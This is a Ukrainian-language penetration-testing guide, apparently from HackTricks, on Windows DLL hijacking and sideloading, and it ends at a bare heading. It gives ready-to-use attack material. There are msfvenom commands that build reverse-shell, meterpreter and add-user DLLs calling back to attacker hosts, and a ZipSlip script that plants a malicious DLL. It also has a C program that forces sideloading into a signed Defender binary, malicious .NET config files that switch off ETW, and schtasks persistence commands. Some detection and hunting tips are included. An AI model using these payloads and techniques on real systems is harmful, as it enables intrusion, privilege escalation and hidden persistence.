# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в тому, що довірену програму змушують завантажити шкідливу DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection і Side-Loading**. Їх переважно використовують для виконання коду та забезпечення persistence, а рідше — для підвищення привілеїв. Хоча тут основна увага приділяється підвищенню привілеїв, метод hijacking залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking використовують кілька методів; ефективність кожного залежить від стратегії завантаження DLL у програмі:<sup>[[4]](#references)</sup>

1. **Заміна DLL**: підміна справжньої DLL шкідливою, за потреби — з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: розміщення шкідливої DLL у шляху пошуку, який має вищий пріоритет за легітимну DLL, з використанням шаблону пошуку програми.
3. **Phantom DLL Hijacking**: створення шкідливої DLL, яку програма завантажить, вважаючи її неіснуючою необхідною DLL.
4. **DLL Redirection**: зміна параметрів пошуку, як-от `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **Заміна DLL у WinSxS**: підміна легітимної DLL шкідливим відповідником у каталозі WinSxS; цей метод часто пов'язаний із DLL side-loading.
6. **DLL Hijacking через відносний шлях**: розміщення шкідливої DLL у контрольованому користувачем каталозі разом із скопійованою програмою; цей підхід нагадує техніки Binary Proxy Execution.

Програма також може використовувати **власний завантажувач DLL**. Привілейований процес може перелічувати дочірній каталог, як-от `Libraries` або `Plugins`, і передавати вибрану DLL допоміжному компоненту, незалежно від звичайного порядку пошуку DLL у Windows. Якщо інший обліковий запис може створювати файли саме в цьому каталозі, розглядайте це як підставу для подальшої перевірки: встановіть ідентичність процесу, фактичні ACL каталогу, правило вибору файлу та наявність доступної операції завантаження. Можливість запису до каталогу поруч із виконуваним файлом сама по собі не доводить, що процес завантажує звідти DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Додавання імпорту до PE після встановлення

За класичного side-loading довірений PE-файл залишається незмінним, а атака використовує механізм визначення шляху до DLL за її ім'ям. Натомість **додавання імпорту** змінює PE-файл, який уже завантажується довіреною програмою. Зловмисник додає дескриптор імпорту та пов'язані з ним записи таблиць пошуку та IAT для DLL під контролем зловмисника. Коли Windows рекурсивно розв'язує цю залежність, вона відображає додану DLL у пам'ять і запускає її код ініціалізації всередині загалом легітимного процесу. Це модифікація PE-файлу на диску, а не та сама операція, що й заміна вказівника на функцію в активній IAT за допомогою runtime hook.<sup>[[31]](#references)[[32]](#references)</sup>

Змінений PE-файл може бути проміжною DLL постачальника, а не виконуваним файлом, який запускає користувач або Task Scheduler. Повторно використовуваний ланцюжок дій:<sup>[[32]](#references)</sup>

1. Скопіюйте легітимний виконуваний файл і його залежності до каталогу під контролем зловмисника.
2. Змініть структури імпорту однієї із залежностей, щоб вони посилалися на шкідливу DLL, зберігши очікувані експорти та звичайну поведінку залежності.
3. Налаштуйте autorun або заплановане завдання на запуск легітимного виконуваного файлу. Завантажувач відобразить змінену залежність, а потім щойно імпортовану DLL. Див. [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks), щоб перелічити завдання.
4. Не розміщуйте ресурсоємні операції в `DllMain`; у спостережуваному випадку завантажувач створив робочий потік і продовжив поетапне розшифрування в ньому.

Це відрізняється від компрометації ланцюга постачання на боці постачальника: пакет постачальника залишається чистим, а імпорт змінюється вже після встановлення. Під час аналізу перевіряйте кожен модуль у підготовленому каталозі, а не лише EXE-файл-хост: порівняйте списки імпортів і хеші залежностей із відомою чистою інсталяцією, перевірте підписи та дослідіть двійкові файли постачальника, запущені з неочікуваних каталогів із правом запису, як-от `C:\ProgramData`. Заплановане завдання, що вказує на скопійований засіб звітування про збої або засіб оновлення в такому каталозі, є особливо корисним напрямом для подальшого аналізу.<sup>[[32]](#references)</sup>


### Hijacking AppDomainManager (`<exe>.config` + збірка зловмисника)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код зловмисника. Якщо цільовий виконуваний файл є **керованою** програмою, CLR також перевіряє **файл конфігурації програми**, названий відповідно до виконуваного файлу (наприклад, `Setup.exe.config`). У цьому файлі можна визначити власний **AppDomainManager**. Якщо конфігурація вказує на збірку під контролем зловмисника, розміщену поруч із EXE, CLR завантажує її **до виконання звичайного шляху коду програми**, і вона запускається в довіреному процесі.<sup>[[24]](#references)</sup>

Згідно зі схемою конфігурації .NET Framework від Microsoft, для використання власного менеджера мають бути наявні обидва елементи: `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Мінімальний менеджер:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Практичні примітки:
- Цей прийом стосується **лише .NET Framework**. Він використовує розбір конфігурації CLR, а не порядок пошуку DLL у Win32.
- Хост має бути справжнім **керованим EXE-файлом**. Швидкий triage: `sigcheck -m target.exe`, `corflags target.exe` або перевірка наявності **CLR Runtime Header** у метаданих PE.
- Назва конфігураційного файла має точно збігатися з назвою виконуваного файла (`<binary>.config`); зазвичай він розташований **поруч із EXE**.
- Це корисно для **підписаних бінарних файлів Microsoft або постачальників**, оскільки довірений EXE залишається незмінним, а шкідлива керована збірка виконується в тому самому процесі.
- Якщо у вас уже є доступний для запису каталог інсталятора/оновлення, AppDomainManager hijacking можна використати як **перший етап**, а потім для наступних етапів застосувати класичне DLL sideloading або reflective loading.

### AppDomainManager як завантажувач і механізм запуску запланованого завдання

Практичний шаблон вторгнення — поєднати довірений керований EXE зі шкідливими `*.config` і DLL AppDomainManager, яка виконує роль лише **невеликого завантажувача**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний інсталятор або засіб оновлення .NET із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Суміжний файл конфігурації змушує CLR завантажити збірку зловмисника **до** запуску логіки легітимної програми.
3. Шкідливий менеджер виконує **перевірку шляху** (наприклад, продовжує роботу, лише якщо хост EXE запущений із `Downloads`, і дозволяє запуск другого етапу лише з `%LOCALAPPDATA%`).
4. Якщо перевірка пройшла успішно, він завантажує справжній payload у доступний для запису користувачем шлях, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і налаштовує persistence за допомогою запланованого завдання.

Чому цей варіант важливий:
- Підписаний хост EXE залишається незмінним, тому triage, під час якого перевіряють лише хеш основного бінарного файла, може не виявити компрометацію.
- Простий **захист від аналізу на основі шляху** є поширеним: переміщення тріади ZIP/EXE/DLL на Desktop, у Temp або шлях пісочниці може навмисно порушити ланцюжок.
- DLL AppDomainManager першого етапу може бути невеликою й малопомітною, тоді як справжній імплант завантажується пізніше.

Мінімальний приклад persistence, який часто трапляється з цим шаблоном:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Нотатки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує підвищення привілеїв до SYSTEM.
- Цю техніку часто доречніше класифікувати як **execution/persistence через зловживання конфігурацією .NET**, а не як класичний missing-DLL search-order hijacking, хоча оператори часто поєднують обидва підходи.

Орієнтири для виявлення:
- Підписані виконувані файли .NET, запущені з **каталогів розпакованих ZIP-архівів**, `Downloads`, `%TEMP%` або інших доступних для запису користувачем папок, поруч із якими є файл `<exe>.config`.
- Нові заплановані завдання, дія яких вказує на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а назви імітують засоби оновлення браузерів чи виробників.
- Короткочасні керовані bootstrap-процеси, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу, якщо шлях до виконуваного файла не відповідає очікуваному каталогу профілю користувача.

### Hijacking наявного запланованого завдання для повторного запуску ланцюжка sideload

Для забезпечення persistence не обмежуйте пошук **створенням нового завдання**. Деякі набори інструментів для вторгнення чекають, поки легітимний інсталятор створить **звичайне завдання оновлення**, а потім **переписують дію завдання**, щоб його наявні назва, автор і тригер залишалися звичними для захисників.

Типовий порядок дій:
1. Встановіть/запустіть легітимне програмне забезпечення та визначте завдання, яке воно зазвичай створює.
2. Експортуйте XML завдання та зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб завдання запускало ваш **довірений EXE-хост** із проміжного каталогу, доступного для запису користувачем; далі він виконає sideload або завантажить справжнє корисне навантаження через AppDomain.
4. Повторно зареєструйте завдання з тією самою назвою, а не створюйте новий, очевидний артефакт persistence.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Чому це непомітніше:
- Назва завдання все ще може виглядати цілком легітимно (наприклад, як програма оновлення від виробника).
- Його запускає **служба Task Scheduler**, тому під час перевірки батьківського процесу чи предків часто виявляється очікуваний ланцюжок планувальника, а не `explorer.exe`.
- Команди DFIR, які шукають лише **нові назви завдань**, можуть пропустити завдання, реєстрація якого вже існувала, але дія тепер указує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований атакувальником.

Швидкі способи пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли в `C:\Windows\System32\Tasks\*` і метадані в `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з базовою версією.
- Створюйте сповіщення, якщо **завдання оновлення, що виглядає як завдання виробника**, запускається з **каталогів, доступних для запису користувачам**, або запускає .NET EXE із файлом `*.config` у тому самому каталозі.

> [!TIP]
> Щоб ознайомитися з покроковим ланцюжком, який поєднує HTML staging, конфігурації AES-CTR і .NET implants із DLL sideloading, перегляньте наведений нижче workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Прив’язування side-loaded stage до командного рядка служби

Для side-loaded DLL може бути потрібен не лише очікуваний EXE-файл хоста та назва DLL. Mandiant описала loader, який прив’язує розшифрування payload до аргументу командного рядка та назви виконуваного файла хоста.<sup>[[33]](#references)</sup> У пізнішому ланцюжку зі службою скопійований легітимний хост завантажував розташований поруч `mscoree.dll`, який експортував `LockClrVersion` і розшифровував вбудований stage лише після отримання ключа AES-128 з аргументу служби та базової назви виконуваного файла хоста. Кожен вхідний рядок обрізався або доповнювався нульовими байтами до 16 байтів; побайтовий ключ обчислювався як `argument XOR embedded_key XOR executable_basename`, після чого payload розшифровувався за допомогою AES-CBC без доповнення. Перейменування хоста або його запуск без очікуваного аргументу змінює ключ і не дає розшифрувати цей stage, навіть якщо DLL усе ще завантажується. Відтворюючи або аналізуючи цей варіант, зберігайте точний аргумент командного рядка та базову назву файла.<sup>[[34]](#references)</sup>

Це **payload gate, накладений на звичайний DLL side-loading**, а не нове правило порядку пошуку DLL і не самостійний примітив підвищення привілеїв. Рівень привілеїв визначається контекстом безпеки служби. У [workflow C2 через GitHub issues/files](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) окремо описано подальше передавання даних.<sup>[[34]](#references)</sup>

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із пакета sysinternals і **встановити такі 2 фільтри**:

![Поширені методи - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Поширені методи - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і відображати лише **File System Activity**:

![Поширені методи - Пошук відсутніх DLL: і відображати лише File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні DLL загалом**, залиште це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у певному виконуваному файлі**, додайте ще один фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його та припиніть захоплення подій.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх DLL

Щоб підвищити привілеї, шукайте **DLL, яку привілейований процес намагається завантажити** з каталогу, доступного вам для запису. Це може статися, якщо ви контролюєте каталог, який шукається раніше за каталог зі справжньою DLL, або якщо запитуваної DLL не існує і ви можете записати файл в один із каталогів пошуку.

### Порядок пошуку DLL

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна дізнатися, як саме завантажуються DLL.**

**Програми Windows** шукають DLL за визначеним набором **шляхів пошуку**, дотримуючись певної послідовності. DLL hijacking стається, коли шкідливу DLL стратегічно розміщують в одному з цих каталогів, щоб вона завантажилася раніше за справжню DLL. Щоб запобігти цьому, потрібно переконатися, що програма використовує абсолютні шляхи до потрібних їй DLL.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. Каталог, з якого завантажено програму.
2. Системний каталог. Щоб отримати шлях до нього, використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. 16-бітний системний каталог. Функції для отримання шляху до цього каталогу немає, але пошук у ньому виконується. (_C:\Windows\System_)
4. Каталог Windows. Щоб отримати шлях до нього, використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
   1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, зазначені в змінній середовища PATH. Зверніть увагу: сюди не входить шлях для окремої програми, указаний у розділі реєстру **App Paths**. Розділ **App Paths** не використовується під час обчислення шляху пошуку DLL.

Це **стандартний** порядок пошуку, якщо ввімкнено **SafeDllSearchMode**. Якщо цей режим вимкнено, поточний каталог переміщується на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (типово режим увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з параметром **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за абсолютним шляхом, а не за назвою. У такому разі Windows шукає саму DLL лише за вказаним шляхом; залежності, запитані за назвою, усе одно шукаються у відповідному порядку.

Існують й інші способи змінити порядок пошуку, але я не описуватиму їх тут.

### Поєднання довільного запису файлів із hijack відсутньої DLL

**Пов’язана техніка:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Використовуйте фільтри **ProcMon** (`Process Name` = цільовий EXE, `Path` закінчується на `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які процес шукає, але не може знайти.<sup>[[14]](#references)</sup>
2. Якщо бінарний файл запускається **за розкладом/службою**, розміщена в **каталозі програми** (пункт №1 у порядку пошуку) DLL з однією з цих назв завантажиться під час наступного запуску. В одному випадку зі сканером .NET процес шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким експортом: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш примітив — це **довільний запис файлів у стилі ZipSlip**, створіть ZIP-файл із записом, який виходить за межі каталогу розпакування, щоб DLL потрапила до каталогу програми:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Доставте архів до контрольованої теки вхідних файлів/спільного ресурсу; коли заплановане завдання повторно запустить процес, він завантажить шкідливу DLL і виконає ваш код від імені облікового запису служби.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL нового процесу — задати поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Якщо вказати тут контрольовану зловмисником теку, цільовий процес, який знаходить імпортовану DLL за назвою (без абсолютного шляху та без використання безпечних прапорців завантаження), можна змусити завантажити шкідливу DLL із цієї теки.

Ключова ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і задайте власний DllPath, що вказує на контрольовану вами теку (наприклад, теку, де розміщено ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл шукатиме DLL за назвою, завантажувач перевірить указаний DllPath під час пошуку, що дасть змогу надійно виконати sideloading, навіть якщо шкідлива DLL не розташована поруч із цільовим EXE.

Примітки та обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Ціль має імпортувати DLL або викликати LoadLibrary для DLL за назвою (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо перехопити. Переспрямовані експорти та SxS можуть змінити пріоритетність пошуку.

Мінімальний приклад на C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Приклад практичного використання
- Розмістіть шкідливий `xmllite.dll` (який експортує потрібні функції або проксіює виклики до справжньої DLL) у каталозі `DllPath`.
- Запустіть підписаний бінарний файл, який, як відомо, шукає `xmllite.dll` за назвою, використовуючи описаний вище метод. Завантажувач знаходить імпорт через заданий `DllPath` і виконує sideloading вашої DLL.

Цю техніку спостерігали в реальних атаках для побудови багатоступеневих ланцюжків sideloading: початковий launcher скидає допоміжну DLL, яка запускає підписаний Microsoft бінарний файл, вразливий до hijacking, із власним `DllPath`, щоб примусово завантажити DLL зловмисника зі staging-каталогу.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking у .NET через `.exe.config`

Для цілей на **.NET Framework** sideloading можна виконати **до `Main()`**, не змінюючи пам’ять, зловживаючи сусіднім файлом **`.exe.config`** програми. Замість того щоб покладатися лише на порядок пошуку DLL у Win32, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим файлом конфігурації та однією або кількома контрольованими зловмисником збірками.

Як працює цей ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Запускається EXE-файл хоста, а **CLR читає `<exe>.config`**.
2. У конфігурації задаються **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб середовище виконання створило контрольований зловмисником `AppDomainManager`.
3. Шкідливий менеджер отримує можливість виконати код **до `Main()`** у довіреному процесі хоста.
4. Та сама конфігурація може змусити CLR спочатку шукати локальні збірки (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), а також послабити перевірку середовища виконання та телеметрію без inline patching.

Типовий для кампаній шаблон (точна вкладеність може відрізнятися залежно від директиви / версії CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Чому це корисно:
- **`<probing privatePath="."/>`** обмежує пошук збірок каталогом програми, перетворюючи цю папку на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** запускають код зловмисника під час ініціалізації CLR, до виконання легітимної логіки програми.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** дає змогу програмі з повною довірою завантажувати непідписані або змінені збірки без помилки перевірки strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** запобігає перенаправленню за політикою видавця на новіші збірки.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір середовища виконання більш передбачуваним.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікава директива, оскільки **CLR вимикає власну видимість через ETW** за допомогою конфігурації, а не через виправлення імплантом `EtwEventWrite` у пам’яті.

Операційна схема, яку спостерігали в нещодавніх кампаніях:
- Етап 1 завантажує `setup.exe`, `setup.exe.config` і локальні збірки.
- Етап 2 копіює їх у правдоподібну папку **оновлення в AppData**, перейменовує хост, наприклад на `update.exe`, і повторно запускає його через **заплановане завдання**.
- Етап 3 перевіряє контекст виконання (наприклад, очікуваний батьківський процес `svchost.exe` від Task Scheduler), перш ніж завантажити кінцеву RAT DLL/експорт.

Ідеї для пошуку:
- Підписані або інші легітимні **виконувані файли .NET**, що запускаються з підозрілими сусідніми файлами **`.config`** у каталогах, доступних для запису користувачам.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Заплановані завдання, що повторно запускають перейменовані бінарні файли оновлення з **`%LOCALAPPDATA%`** або каталогів `\bin\update\` конкретних програм.
- Ланцюжки батьківських і дочірніх процесів, у яких заплановане завдання запускає довірений хост .NET, що одразу завантажує збірки не від постачальника зі свого каталогу.

#### Винятки з порядку пошуку DLL у документації Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Коли виявляється **DLL з такою самою назвою, як у вже завантаженої в пам’ять**, система обходить звичайний пошук. Натомість вона перевіряє перенаправлення та маніфест, а потім за замовчуванням використовує DLL, уже завантажену в пам’ять. **У цьому випадку система не шукає DLL**.
- Якщо DLL розпізнано як **відому DLL** для поточної версії Windows, система використовує свою версію цієї відомої DLL разом із залежними від неї DLL, **не виконуючи пошук**. У розділі реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** зберігається список цих відомих DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише за своїми **іменами модулів**, незалежно від того, чи було початкову DLL знайдено за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Знайти процес, який працює або працюватиме з **іншими привілеями** (горизонтальне або латеральне переміщення) і **не має DLL**.
- Переконатися, що є **доступ на запис** до будь-якого **каталогу**, у якому виконується **пошук DLL**. Це може бути каталог виконуваного файла або каталог у системному шляху.

За замовчуванням такі передумови трапляються рідко: привілейованим виконуваним файлам зазвичай не бракує залежностей DLL, а звичайні користувачі зазвичай не можуть записувати дані в каталоги системного шляху пошуку. Однак неправильно налаштовані середовища можуть створювати обидві умови.\
Якщо вимоги виконано, перегляньте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — обхід UAC, він містить PoC для DLL hijacking у певних версіях Windows, які часто можна адаптувати до знайденого каталогу з доступом на запис.

Зверніть увагу, що **перевірити дозволи на папку** можна так:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

І **перевірте дозволи всіх папок у PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Також можна перевірити імпорти виконуваного файла та експорти DLL за допомогою:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Для повного посібника про те, як **використати DLL Hijacking для підвищення привілеїв**, маючи дозволи на запис у папку **System Path**, дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис у будь-яку папку в системному PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ і _Write-HijackDll._

### Приклад

Якщо ви знайдете сценарій, який можна використати, одна з найважливіших умов успішної експлуатації — **створити dll, яка експортує щонайменше всі функції, що виконуваний файл імпортуватиме з неї**. У будь-якому разі, зауважте, що DLL Hijacking стане в пригоді для [підвищення рівня цілісності з Medium до High **(обхід UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад того, **як створити коректну dll**, можна знайти в цьому дослідженні DLL hijacking, присвяченому DLL hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете кілька **базових прикладів коду dll**, які можуть стати в пригоді як **шаблони** або для створення **dll з експортованими функціями, які не є обов’язковими**.

## **Створення та компіляція DLL**

### **DLL Proxifying**

Загалом, **DLL proxy** — це DLL, здатна **виконати ваш шкідливий код під час завантаження**, а також **надавати** функції та **працювати** так, як **очікується**, **переспрямовуючи всі виклики до справжньої бібліотеки**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна **вказати виконуваний файл і вибрати бібліотеку** для проксіювання, а потім **згенерувати проксійовану dll**, або **вказати DLL** і **згенерувати проксійовану dll**.

### **Meterpreter**

**Отримати rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Отримати meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Створіть користувача (x86 — версії для x64 я не знайшов):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Власний

